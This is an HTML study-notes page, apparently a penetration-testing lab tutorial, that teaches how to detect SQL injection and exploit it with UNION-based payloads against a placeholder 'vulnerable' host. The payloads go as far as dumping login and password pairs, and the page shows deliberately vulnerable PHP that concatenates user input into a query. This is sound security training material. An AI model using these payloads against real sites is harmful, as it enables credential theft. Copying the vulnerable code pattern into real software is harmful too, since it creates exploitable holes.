<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Detection and Exploitation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Detection and Exploitation</h1><br/><br /><h1>Detection and exploitation of SQL injection</h1><br /><br /><h2>Detection of SQL injection</h2><br /><br /><h3>Introduction to SQL</h3><br />In order to understand, detect and exploit SQL injections, you need  to understand the Structured Query Language (SQL). SQL allows a  developer to perform the following requests:<br />• retrieve information using the <code>SELECT</code> statement;<br />• update information using the <code>UPDATE</code> statement;<br />• add new information using the <code>INSERT</code> statement;<br />• delete information using the <code>DELETE</code> statement.<br />More operations (to create/remove/modify tables, databases or  triggers) are available but are less likely to be used in web  applications.<br />The most common query used by web sites is the SELECT statement which  is used to retrieve information from the database. The SELECT statement  follows the following syntax:<br /><code>SELECT column1, column2, column3 FROM table1 WHERE column4='string1'  AND column5=integer1 AND column6=integer2;</code>In this query, the following information is provided to the database:<br />•  the <code>SELECT</code> statement indicates the action to perform: retrieve information;<br />•  the list of columns indicates what columns are expected;<br />•  the <code>FROM table1</code> indicates from what tables the records are fetched;<br />•  the conditions following the <code>WHERE</code> statement are used to indicate what conditions the records should meet.<br />The <code>string1</code> value is delimited by a simple quote and the integers <code>integer1</code> and <code>integer2</code> can be delimited by a simple quote (<code>integer2</code>) or just put directly in the query (<code>integer1</code>).<br />For example, let see what the request:<br /><code>SELECT column1, column2, column3 FROM table1 WHERE column4='user'  AND column5=3 AND column6=4;</code>will retrieve from the following table:<br /><table class="table"><col/><col/><col/><col/><col/><col/><tr><th>column1</th><th>column2</th><th>column3</th><th>column4</th><th>column5</th><th>column6</th></tr><tr><td>1</td><td>test</td><td>Paul</td><td>user</td><td>3</td><td>13</td></tr><tr><td>2</td><td>test1</td><td>Robert</td><td>user</td><td>3</td><td>4</td></tr><tr><td>3</td><td>test33</td><td>Super</td><td>user</td><td>3</td><td>4</td></tr></table><br />Using the previous query, the following results will be retrieved:<br /><table class="table"><col/><col/><col/><tr><th>column1</th><th>column2</th><th>column3</th></tr><tr><td>2</td><td>test1</td><td>Robert</td></tr><tr><td>3</td><td>test33</td><td>Super</td></tr></table><br />As we can see, only these values are returned since they are the only ones matching all of the conditions in the <code>WHERE</code> statement.<br />If you read source code dealing with some databases, you will often see <code>SELECT * FROM tablename</code>. The <code>*</code> is a wildcard requesting the database to return all columns and avoid the need to name them all.<br /><br /><h3>Detection based on Integers</h3><br />Since error messages are displayed, it's quite easy to detect any  vulnerability in the website. SQL injections can be detected using any  and all of the following methods.<br />          All these methods are based on the general behaviour of databases, finding and exploiting SQL injections depends on a lot of different factors, although these methods are not 100% reliable on their own. This is why you may need to try several of them to make sure the given parameter is vulnerable.   Let's take the example of a shopping website, when accessing the URL  /cat.php?id=1, you will see the picture article1. The following table  shows what you will see for different values of id:<br /><table class="table"><col/><col/><tr><th>URL</th><th>Article displayed</th></tr><tr><td>/article.php?id=1</td><td>Article 1</td></tr><tr><td>/article.php?id=2</td><td>Article 2</td></tr><tr><td>/article.php?id=3</td><td>Article 3</td></tr></table><br />The PHP code behind this page is:<br /><code>&lt;?php<br />$id = $_GET["id"];<br />$result= mysql_query("SELECT * FROM articles WHERE id=".$id);<br />$row = mysql_fetch_assoc($result);<br />// ... display of an article from the query result ...<br />?&gt;<br /></code>The value provided by the user (`$_GET["id]`) is directly echoed in the SQL request.For example, accessing the URL:* `/article.php?id=1` will generate the following request: `SELECT * FROM articles WHERE id=1`* `/article.php?id=2` will generate the following request `SELECT * FROM articles WHERE id=2`If a user try to access the URL `/article.php?id=2'`, the following request will be executed `SELECT * FROM articles WHERE id=2'`. However, the syntax of this SQL request is incorrect because of the single quote `'` and the database will throw an error. For example, MySQL will throw the following error message:You have an error in your SQL syntax; check the <br />manual that corresponds to your MySQL server <br />version for the right syntax to use near <br />''' at line 1 <br />This error message may or may not be visible in the HTTP response depending on the PHP configuration.<br />The value provided in the URL is directly echoed in the request and  considered as an integer, this allows you to ask the database to perform  basic mathematical operation for you:<br />• if you try to access <code>/article.php?id=2-1</code>, the following request will be sent to the database <code>SELECT * FROM articles WHERE id=2-1</code>, and the article1's information will be display in the web page since the previous query is equivalent to <code>SELECT * FROM articles WHERE id=1</code> (the subtraction will be automatically performed by the database).<br />• if you try to access <code>/article.php?id=2-0</code>, the following request will be sent to the database <code>SELECT * FROM articles WHERE id=2-0</code>, and the article2's information will be displayed in the web page since the previous query is equivalent to <code>SELECT * FROM articles WHERE id=2</code>.<br />These properties provide a good method of detecting SQL injection:<br />• if accessing /article.php?id=2-1 displays article1 and accessing /article.php?id=2-0 displays article2, the subtraction is performed by the database, and you're likely to have found a SQL injection<br />• if accessing /article.php?id=2-1 displays article2 and accessing /article.php?id=2-0 displays article2 as well, it's unlikely that you have SQL injection on an integer, but you may have SQL injection on a string value as we will see. <br />• if you put a quote in the URL (<code>/article.php?id=1'</code>), you should receive an error.<br />          Even if a value is an integer (for example categorie.php?id=1), it can be used as a string in the SQL query:<br /> SELECT * FROM categories where id='1'.<br />SQL allows both syntax, however using a string in the SQL statement will  be slower than using an integer.  <br /><h3>Detection on Strings</h3><br />As we saw before in "Introduction to SQL", strings in an SQL query  are put between quotes when used as value (example with 'test'):<br />SELECT id,name FROM users where name='test';<br />If SQL injection is present in the web page, injecting a single quote <code>'</code> will break the query syntax and generate an error. Furthermore, injecting 2 times a single quote <code>''</code>  won't break the query anymore. As a general rule, an odd number of  single quotes will throw an error, an even number of single quotes  won't. <br />It is also possible to comment out the end of the query, so in most  cases you won't get an error (depending on the query format). To comment  out the end of the query you can use <code>' --</code>. <br />For example the query, with an injection point in the test value:<br />SELECT id,name FROM users where name='test' and id=3;<br />will become:<br />SELECT id,name FROM users where name='test' -- ' and id=3;<br />and will get interpreted as: <br />SELECT id,name FROM users where name='test' <br />However this test can still generate an error if the query follows the pattern below:<br />SELECT id,name FROM users where ( name='test' and id=3 );<br />Since the right parenthesis will be missing once the end of the query  is commented out. You can obviously try with one or more parenthesis to  find a value that doesn't create an error. <br />Another way to test it, is to use <code>' and '1'='1</code>, this  injection is less likely to impact the query since it is less likely to  break it. For example if injected in the previous query, we can see that  the syntax is still correct:<br />SELECT id,name FROM users where ( name='test' and '1'='1' and id=3 );<br />Furthermore and <code>' and '1'='1</code> is less likely to impact  the semantic of the request and the results of with and without  injection are likely to be the same. We can then compare it with the  page generated using the following injection <code>' and '1'='0</code> which is less likely to create an error but is likely to change the semantic of the query. <br />            SQL injection is not an accurate science and a lot of things can impact the result of your testing. If you think something is going on, keep working on the injection and try to figure out what the code is doing with your injection to ensure it's an SQL injection.  In order to find the SQL injection, you need to visit the website and  try these methods on  all parameters for each page. Once you have found  the SQL injection, you can move to the next section to learn how to  exploit it.<br /><br /><h2>Exploitation of SQL injections</h2><br />Now We have found a SQL injection in the page <a href="http://vulnerable/cat.php">http://vulnerable/cat.php</a>, in order to go further, we will need to exploit it to retrieve information. To do so, we will need to learn about the <code>UNION</code> keyword available in SQL.<br /><br /><h3>The UNION keyword</h3><br />The UNION statement is used to put together information from two requests:<br />SELECT * FROM articles WHERE id=3 UNION SELECT ...<br />Since it is used to retrieve information from other tables, it can be  used as a SQL injection payload. The beginning of the query can't be  modify directly by the attacker since it's generated by the PHP code.  However using UNION, the attacker can manipulate the end of the query  and retrieve information from other tables:<br />SELECT id,name,price FROM articles WHERE id=3  <br />UNION SELECT id,login,password  FROM users<br />The most important rule, is that both statements should return the  same number of columns otherwise the database will trigger an error.<br /><br /><h3>Exploiting SQL injections with UNION</h3><br />Exploiting SQL injection using <code>UNION</code> follows the steps below:<br /><br />1. Find the number of columns to perform the UNION<br />2. Find what columns are echoed in the page<br />3. Retrieve information from the database meta-tables<br />4. Retrieve information from other tables/databases<br /><br />In order to perform a request by SQL injection, you need to find the  number of columns that are returned by the first part of the query.  Unless you have the source code of the application, you will have to  guess this number. <br />There are two methods to get this information:<br />• using UNION SELECT and increase the number of columns;<br />• using ORDER BY statement.<br />If you try to do a UNION and the number of columns returned by the two queries are different, the database will throw an error:<br />The used SELECT statements have a different <br />number of columns  <br />You can use this property to guess the number of columns. For example, if you can inject in the following query: <code>SELECT id,name,price FROM articles where id=1</code>. You will try the following steps:<br />• <code>SELECT id,name,price FROM articles where id=1 UNION SELECT 1</code>, the injection <code>1 UNION SELECT 1</code> will return an error since the number of columns are different in the two sub-parts of the query;<br />• <code>SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2</code>, for the same reason as above, the payload <code>1 UNION SELECT 1,2</code> will return an error;<br />• <code>SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2,3</code>, since both sub-parts have the same number of columns, this query won't throw an error. You may even be able to see one of the numbers in the page or in the source code of the page.<br />NB: this works for MySQL the methodology is different for other  databases, the values 1,2,3,... should be changed to null,null,null, ...  for database that need the same type of value in the 2 sides of the  UNION keyword. For Oracle, when SELECT is used the keyword FROM needs to  be used, the table dual can be used to complete the request: <code>UNION SELECT null,null,null FROM dual</code> <br /><br />The other method uses the keyword <code>ORDER BY</code>. <code>ORDER BY</code> is mostly used to tell the database what column should be used to sort results:<br /><br />SELECT firstname,lastname,age,groups FROM users ORDER BY firstname<br /><br />The request above will return the users sorted by the firstname column.<br /><code>ORDER BY</code> can also be used to with an integer to tell the database to sort by the column number X:<br />SELECT firstname,lastname,age,groups FROM users ORDER BY 3<br />The request above will return the users sorted by the third column.<br />This feature can be used to detect the number of columns, if the column number in the <code>ORDER BY</code> statement is bigger than the number of columns in the query, an error is thrown (example with 10):<br />Unknown column '10' in 'order clause'<br />You can use this property to guess the number of columns. For example, if you can inject in the following query: <code>SELECT id,name,price FROM articles where id=1</code>. You can try the following steps:<br />• <code>SELECT id,name,price FROM articles where id=1 ORDER BY 5</code>, the injection <code>1 ORDER BY 5</code> will return an error since the number of columns is less than 5 in the first part of the query;<br />• <code>SELECT id,name,price FROM articles where id=1 ORDER BY 3</code>, the injection <code>1 ORDER BY 3</code> will not return an error since the number of columns is less than or equal of 3 in the first part of the query;<br />• <code>SELECT id,name,price FROM articles where id=1 ORDER BY 4</code>, the injection <code>1 ORDER BY 4</code> will return an error since the number of columns is less than 4 in the first part of the query;<br />Based on this dichotomic search, we know that the number of columns  is 3,  we can now use this information to build the final query:<br />SELECT id,name,price FROM articles where id=1 UNION SELECT 1,2,3<br />Even if this methodology provides the same number of requests for  this example, it's significantly faster as soon as the number of columns  grow.<br /><br /><h3>Retrieving information</h3><br />Now that we know the number of columns, we can retrieve information  from the database. Based on the error message we received, we know that  the backend database used is MySQL. <br />Using this information, we can force the database to perform a function or to send us information:<br />• the user used by the PHP application to connect to the database with <code>current_user()</code><br />• the version of the database using <code>version()</code><br />In order to perform this, we are going to need to replace one of the values in the previous statement (<code>UNION SELECT 1,2,3</code>) by the function we want to run in order to retrieve the result in the response.<br />            Make sure you always keep the right number of columns when you try to retrieve information.  You can for example access the following URL's to retrieve this information:<br />• the database version: <a href="http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4">http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4</a><br />• the current user: <a href="http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,current_user(),3,4">http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,current_user(),3,4</a><br />• the current database: <a href="http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,database(),3,4">http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,database(),3,4</a><br />We are now able to retrieve information from the database and  retrieve arbitrary content. In order to retrieve information related to  the current application, we are going to need:<br />• the name of all tables in the current database<br />• the name of the column for the table we want to retrieve information from<br />MySQL provides tables containing meta-information about the database,  tables and columns available since the version 5 of MySQL. We are going  to use these tables to retrieve the information we need to build the  final request. These tables are stored in the database  information_schema. <br /> The following queries can be used to retrieve:<br />• the list of all tables: <code>SELECT table_name FROM information_schema.tables</code><br />• the list of all columns: <code>SELECT column_name FROM information_schema.columns</code> <br />By mixing these queries and the previous URL, you can guess what page to access to retrieve information:<br />• the list of tables: <code>1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables</code><br />• the list of columns: <code>1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns</code><br />The problem, is that these requests provide you a raw list of all  tables and columns, but to query the database and retrieve interesting  information, you will need to know what column belongs to what table.  Hopefully, the table information_schema.columns stores table names:<br />SELECT table_name,column_name FROM information_schema.columns<br />To retrieve this information, we can either <br />• put tablename and columnname in different parts of the injection: <code>1 UNION SELECT 1, table_name, column_name,4 FROM information_schema.columns</code><br />• concatenate tablename and columnname in the same part of the injection using the keyword CONCAT: <code>1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns</code>. <code>':'</code> is used to be able to easily split the results of the query.<br />            If you want to easily retrieve information from the resulting page using a regular expression (if you want to write an SQL injection script for example), you can use a marker in the injection: ``1 UNION SELECT 1,concat('^^^',table_name,':',column_name,'^^^') FROM information_schema.columns`. It then is really easy to match the result in the page.  You have now a list of tables and their columns, the first tables and  columns are the default MySQL tables. At the end of the HTML page, we  can see a list of tables that are likely to be used by the current  application:<br /><img src="images/1171-1.png" alt="images/1171-1.png" /><br />Using this information, you can now build a query to retrieve information from this table:<br />1 UNION SELECT 1,concat(login,':',password),3,4 FROM users;<br />And get the username and password used to access the administration pages:<br /><img src="images/1171-2.png" alt="images/1171-2.png" /><br />            The SQL injection provided the same level of access as the user used by the application to connect to the database (current_user())... That is why it is always important to provide the lowest privileges possible to this user when you deploy a web application.  </div></body></html>